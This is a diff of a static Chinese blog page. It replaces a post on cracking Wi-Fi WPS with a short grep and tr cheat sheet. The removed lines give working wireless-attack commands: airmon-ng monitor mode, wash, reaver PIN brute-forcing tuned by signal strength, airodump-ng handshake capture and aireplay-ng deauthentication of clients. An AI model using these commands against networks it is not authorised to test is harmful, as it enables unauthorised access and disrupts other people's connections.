@@ -5,30 +5,38 @@
 <head>
   <meta charset="UTF-8">
   
-    <title>A1exlism</title>
+    <title>grep | A1exlism</title>
     <meta name="viewport" content="width=device-width, initial-scale=1,user-scalable=no">
     
     <meta name="author" content="A1ex">
     
 
     
-    <meta name="description" content="本机开启monitor模式的网卡名字为:wlan1mon
-WPS破解使用网卡混杂模式(monitor)airmon-ng 查看网卡信息airmon-ng start wlan1(原网卡名字为wlan1)
-可能会出现process占用问题airmon-ng check           查看占用进程iwconfig                  查看网卡是否处于monitor状态sudo ai">
+    <meta name="description" content="grep用正则来查找文件内容
+
+grep ^g passwd          #在passwd文件中查找以’g’为开头的字符串
+-v      —invert-match    #反向查找
+grep -v [NP] passwd &amp;gt; newpasswd      #创建一个newpasswd文件,将不含NP字样的内容传给newpasswdchua
+-c      —countgrep -c">
 <meta property="og:type" content="website">
-<meta property="og:title" content="A1exlism">
-<meta property="og:url" content="http://a1ex.net/Others/pending/wifiCrack.html">
+<meta property="og:title" content="grep">
+<meta property="og:url" content="http://a1ex.net/wait/bash3.html">
 <meta property="og:site_name" content="A1exlism">
-<meta property="og:description" content="本机开启monitor模式的网卡名字为:wlan1mon
-WPS破解使用网卡混杂模式(monitor)airmon-ng 查看网卡信息airmon-ng start wlan1(原网卡名字为wlan1)
-可能会出现process占用问题airmon-ng check           查看占用进程iwconfig                  查看网卡是否处于monitor状态sudo ai">
-<meta property="og:image" content="http://a1ex.net/imgs/xxxxxxx">
-<meta property="og:updated_time" content="2015-11-06T10:36:39.925Z">
+<meta property="og:description" content="grep用正则来查找文件内容
+
+grep ^g passwd          #在passwd文件中查找以’g’为开头的字符串
+-v      —invert-match    #反向查找
+grep -v [NP] passwd &amp;gt; newpasswd      #创建一个newpasswd文件,将不含NP字样的内容传给newpasswdchua
+-c      —countgrep -c">
+<meta property="og:updated_time" content="2015-11-22T10:09:16.926Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="A1exlism">
-<meta name="twitter:description" content="本机开启monitor模式的网卡名字为:wlan1mon
-WPS破解使用网卡混杂模式(monitor)airmon-ng 查看网卡信息airmon-ng start wlan1(原网卡名字为wlan1)
-可能会出现process占用问题airmon-ng check           查看占用进程iwconfig                  查看网卡是否处于monitor状态sudo ai">
+<meta name="twitter:title" content="grep">
+<meta name="twitter:description" content="grep用正则来查找文件内容
+
+grep ^g passwd          #在passwd文件中查找以’g’为开头的字符串
+-v      —invert-match    #反向查找
+grep -v [NP] passwd &amp;gt; newpasswd      #创建一个newpasswd文件,将不含NP字样的内容传给newpasswdchua
+-c      —countgrep -c">
 <link rel="publisher" href="106896526077043222500">
 
     
@@ -86,30 +94,28 @@ WPS破解使用网卡混杂模式(monitor)airmon-ng 查看网卡信息airmon-ng 
 		<header class="article-info clearfix">
   <h1 itemprop="name">
     
-      <a href="/Others/pending/wifiCrack.html" title="" itemprop="url"></a>
+      <a href="/wait/bash3.html" title="grep" itemprop="url">grep</a>
   </h1>
   <p class="article-author">By
        
 		<a href="https://plus.google.com/106896526077043222500?rel=author" title="A1ex" target="_blank" itemprop="author">A1ex</a>
 		
   <p class="article-time">
-    <time datetime="2015-11-13T07:31:11.241Z" itemprop="datePublished"> 发表于 11-13-2015</time>
+    <time datetime="2015-11-22T10:09:16.926Z" itemprop="datePublished"> 发表于 11-22-2015</time>
     
   </p>
 </header>
 	<div class="article-content">
 		
-		<p>本机开启monitor模式的网卡名字为:wlan1mon</p>
-<h2 id="WPS破解">WPS破解</h2><h3 id="使用网卡混杂模式(monitor)">使用网卡混杂模式(monitor)</h3><p>airmon-ng 查看网卡信息<br>airmon-ng start wlan1(原网卡名字为wlan1)<br><img src="/imgs/xxxxxxx" alt="1"></p>
-<h4 id="可能会出现process占用问题">可能会出现process占用问题</h4><p>airmon-ng check           查看占用进程<br>iwconfig                  查看网卡是否处于monitor状态<br>sudo airmon-ng check kill 最直接的方法..所有占用的直接all kill</p>
-<h3 id="查看wps">查看wps</h3><p>sudo wash -i wlan1mon -C</p>
-<h3 id="扫描">扫描</h3><p>airodump-ng wlan1mon<br>(MB选项的54e.和54e已经不能判断wps了)</p>
-<p>目标信号非常好: reaver -i mon0 -b MAC -a -S -vv -d0 -c 1<br>目标信号普通: reaver -i mon0 -b MAC -a -S -vv -d2 -t 5 -c 1<br>目标信号一般: reaver -i mon0 -b MAC -a -S -vv -d5 -c 1</p>
-<p>6C:59:40:44:AB:64</p>
-<p>reaver -i wlan1mon -b mac地址 -a -S -vv -d0 -c 1</p>
-<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1. airodump-ng -w freedom -c CH --bssid  mac&#22320;&#22336; wlan1mon --ignore-negative-one&#10;CH&#34920;&#31034;&#20449;&#36947;&#65292;&#20449;&#36947;&#26159;&#22810;&#23569;&#23601;&#22635;&#22810;&#23569;&#65292;freedom&#26159;&#19968;&#20250;&#25235;&#25569;&#25163;&#21253;&#30340;&#25991;&#20214;&#21517;&#23383;&#65292;&#20182;&#20250;&#33258;&#21160;&#29983;&#25104;&#19968;&#20010;freedom.cap&#30340;&#25991;&#20214;&#65292;&#36825;&#20010;&#21517;&#23383;&#38543;&#20415;&#20320;&#20204;&#22635;&#20160;&#20040;&#10;2. &#37325;&#26032;&#24320;&#19968;&#20010;&#23458;&#25143;&#31471;&#36755;&#20837;&#21629;&#20196;&#65306;&#10;aireplay-ng --deaut 10 -a &#36335;&#30001;&#22120;mac -c &#23458;&#25143;&#31471;mac wlan1mon --ignore-negative-one</span><br></pre></td></tr></table></figure>
-<h3 id="Reference:">Reference:</h3><p><a href="http://www.secbox.cn/hacker/wireless/4877.html" target="_blank" rel="external">secbox</a><br><a href="http://www.kali.org.cn/thread-17187-1-1.html" target="_blank" rel="external">kali.org</a><br><a href="http://unix.stackexchange.com/questions/162088/why-airmon-ng-does-not-create-a-monitoring-interface" target="_blank" rel="external">stackexchange</a><br><a href="http://www.freebuf.com/tools/75517.html" target="_blank" rel="external">Frebuf</a><br><a href="http://www.hackingtutorials.org/wifi-hacking-tutorials/pixie-dust-attack-wps-in-kali-linux-with-reaver/" target="_blank" rel="external">hackingtutorials</a></p>
-<p><a href="http://netsecurity.51cto.com/art/201105/264844_all.htm" target="_blank" rel="external">http://netsecurity.51cto.com/art/201105/264844_all.htm</a></p>
+		<h2 id="grep">grep</h2><p>用<code>正则</code>来查找文件内容</p>
+<ol>
+<li>grep ^g passwd          #在passwd文件中查找以’g’为开头的字符串</li>
+<li>-v      —invert-match    #反向查找</li>
+<li>grep -v [NP] passwd &gt; newpasswd      #创建一个newpasswd文件,将不含NP字样的内容传给newpasswdchua</li>
+<li>-c      —count<br>grep -c ^g passwd           #返回匹配到的行数 </li>
+<li>例子:<br>grep ^a[bcd]omi[efg]e$       #查找以a为首e为尾这样一行</li>
+</ol>
+<h2 id="tr">tr</h2><p>tr    translate<br>tr ‘a’ ‘b’          将a换成b<br>tr -d  ‘a’          —delete    ‘a’</p>
   
 	</div>
 		<footer class="article-footer clearfix">
@@ -117,7 +123,7 @@ WPS破解使用网卡混杂模式(monitor)airmon-ng 查看网卡信息airmon-ng 
 
 	<div class="article-share" id="share">
 	
-	  <div data-url="http://a1ex.net/Others/pending/wifiCrack.html" data-title="A1exlism" data-tsina="null" class="share clearfix">
+	  <div data-url="http://a1ex.net/wait/bash3.html" data-title="grep | A1exlism" data-tsina="null" class="share clearfix">
 	  </div>
 	
 	</div>
@@ -130,7 +136,7 @@ WPS破解使用网卡混杂模式(monitor)airmon-ng 查看网卡信息airmon-ng 
 	
 	
 <section id="comments" class="comment">
-	<div class="ds-thread" data-thread-key="Others/pending/wifiCrack.html" data-title="" data-url="http://a1ex.net/Others/pending/wifiCrack.html"></div>
+	<div class="ds-thread" data-thread-key="wait/bash3.html" data-title="grep" data-url="http://a1ex.net/wait/bash3.html"></div>
 </section>
 
 
